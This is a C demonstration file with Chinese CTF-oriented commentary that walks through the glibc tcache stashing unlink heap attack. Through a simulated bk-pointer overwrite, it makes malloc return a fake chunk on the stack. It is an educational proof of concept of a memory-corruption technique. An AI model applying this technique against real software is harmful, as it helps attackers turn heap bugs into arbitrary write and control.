/*
 * 本文件是 small bin attack 汇总目录下的一份副本，对应 smallbin→tcache
 * stashing unlink 这条分支，从 2.41 开始就已经失效。详细的中文原理、
 * 漏洞模拟位置和成功判据见下方导读以及本目录的 README。保留这份副本，
 * 是为了让 CTF 选手按“small bin attack”这个术语就能直接检索到。
 */
/*
 * 中文导读（CTF 版）
 *
 * 手法：tcache_stashing_unlink_attack
 * 文件标注范围：2.26 ~ 2.40
 * 模拟漏洞：可以改写 smallbin chunk 的 bk 指针；对应尺寸的 tcache 必须为空。
 * 核心流程：calloc/malloc 从 smallbin 里取块满足请求时，会把多出来的节点
 * 顺手 stash 进 tcache，这个过程中会执行 bck->fd 的写入，攻击者正是借此
 * 把一个伪造节点链入 tcache。
 * 成功判据：目标地址被写入 main_arena 指针，并且这块内存能被后续申请取回；
 * 2.41 重构了 smallbin→tcache 的处理流程后，这种攻击形式就不再成立了。
 *
 * 阅读约定：malloc 返回的是用户数据区地址；源码里 p[-1] 通常是 size 字段，
 * p[-2] 是 prev_size 字段。文件中所有故意为之的 UAF、越界写和 double free
 * 都是在模拟漏洞，不代表正常的 C 用法。具体版本范围以本目录 README 和验证
 * 矩阵为准；如果发行版回移了补丁，应按实际 libc 源码重新判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    setbuf(stdout, NULL);

    // stack_var 用来承载我们希望 malloc 最终返回的伪 chunk，周围的字段按
    // smallbin 节点的布局摆放，好让后续的解链检查能通过。

    stack_var[3] = (unsigned long)(&stack_var[2]);

    // 先申请 9 个同尺寸的 chunk：其中 7 个用来填满 tcache，另外 2 个进入
    // unsorted bin 后再参与后面的 smallbin 操作。
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    // 释放前 7 个 chunk，把这个尺寸对应的 tcache bin 填满。

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    // 这是最后一个能进入 tcache 的节点；之后再释放同尺寸的块就会绕开 tcache。
    free(chunk_lis[1]);
    // tcache 已经满了，所以接下来释放的这两个 chunk 会先进入 unsorted bin。
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    // 用一个这些块都无法满足的较大申请触发分类，把 unsorted bin 里的目标块移进 smallbin。

    malloc(0xa0);// size > 0x90

    // 从 tcache 里取走两个节点，让该尺寸的桶只剩 5 个空闲块，为后面的 stashing 腾出两个槽位。

    malloc(0x90);
    malloc(0x90);

    // 漏洞模拟：覆盖 victim->bk，让 smallbin stashing 过程中的反向遍历被引导到栈上的伪 chunk。
    /* 漏洞模拟开始/结束 */
    chunk_lis[2][1] = (unsigned long)stack_var;
    /* 漏洞模拟开始/结束 */

    // 申请一个走 calloc 路径处理的同尺寸块，触发 smallbin 解链以及 tcache stashing 的写入。

    calloc(1,0x90);

    // 再次申请时会从 tcache 里取出刚刚暂存的伪节点，返回的正是栈上 fake chunk 的用户区地址。
    target = malloc(0x90);

    assert(target == &stack_var[2]);
    return 0;
}
